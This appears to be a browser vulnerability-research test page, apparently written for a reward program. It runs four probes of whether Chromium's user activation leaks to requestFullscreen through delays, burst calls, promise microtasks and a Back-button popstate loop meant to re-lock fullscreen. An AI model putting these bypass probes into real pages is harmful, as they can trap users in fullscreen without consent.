<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VRP Research Lab - Activation Leak</title>
    <style>
        body { background: #121212; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
        .test-btn { 
            display: block; width: 80%; margin: 10px auto; padding: 15px; 
            background: #333; color: #fff; border: 1px solid #555; cursor: pointer;
        }
        .status { margin-top: 20px; color: yellow; border: 1px solid #444; padding: 10px; min-height: 50px; }
    </style>
</head>
<body>

    <h2>🔬 Activation Leak Test Lab</h2>
    <p>Target: Chromium Activation Model</p>

    <button class="test-btn" onclick="test1()">🔥 TEST 1: 2s Async Delay</button>
    <button class="test-btn" onclick="test2()">🔥 TEST 2: Multiple Burst Calls</button>
    <button class="test-btn" onclick="test3()">🔥 TEST 3: Promise Chain (Microtask)</button>
    <button class="test-btn" onclick="test4()">🔥 TEST 4: Single Alert Persistence</button>

    <div class="status" id="statusBox">Status: Waiting for interaction...</div>

    <script>
        const el = document.documentElement;
        const log = (msg) => document.getElementById('statusBox').innerText = "Status: " + msg;

        // TEST 1: Apakah 'User Activation' bocor setelah delay lama?
        function test1() {
            alert("Test 1: Menunggu 2 detik setelah OK...");
            setTimeout(() => {
                el.requestFullscreen()
                    .then(() => log("SUCCESS: Activation LEAKED after 2s delay! (VALID BUG)"))
                    .catch(e => log("FAILED: Activation expired (Intended)"));
            }, 2000);
        }

        // TEST 2: Apakah bisa memanggil API sensitif berkali-kali (Burst)?
        function test2() {
            alert("Test 2: Mencoba Multiple Burst...");
            setTimeout(() => {
                let successCount = 0;
                const tryFS = () => el.requestFullscreen().then(() => successCount++);
                
                tryFS(); tryFS(); tryFS();
                
                setTimeout(() => {
                    log(`Burst Result: ${successCount} calls successful.`);
                    if(successCount > 1) alert("Bypass Detected: Multiple FS calls allowed!");
                }, 500);
            }, 50);
        }

        // TEST 3: Apakah Microtask (Promise) bisa mengecoh guard?
        function test3() {
            alert("Test 3: Promise Microtask Test...");
            Promise.resolve().then(() => {
                el.requestFullscreen()
                    .then(() => log("SUCCESS: Promise Chain Bypass! (VALID BUG)"))
                    .catch(e => log("FAILED: Promise guard active (Intended)"));
            });
        }

        // TEST 4: Single Alert Persistence (The Loop)
        function test4() {
            alert("Test 4: Klik OK sekali, lalu tekan BACK sistem berkali-kali.");
            window.history.pushState({p:1}, "", "");
            
            window.onpopstate = function() {
                // Mencoba FS tanpa alert baru di sini
                el.requestFullscreen()
                    .then(() => log("SUCCESS: Loop Re-lock without new Alert! (CRITICAL)"))
                    .catch(e => {
                        log("FAILED: Needs new Alert to re-activate.");
                        // Jika gagal, ini membuktikan hipotesis ke-7 kamu benar.
                    });
            };
        }
    </script>
</body>
</html>
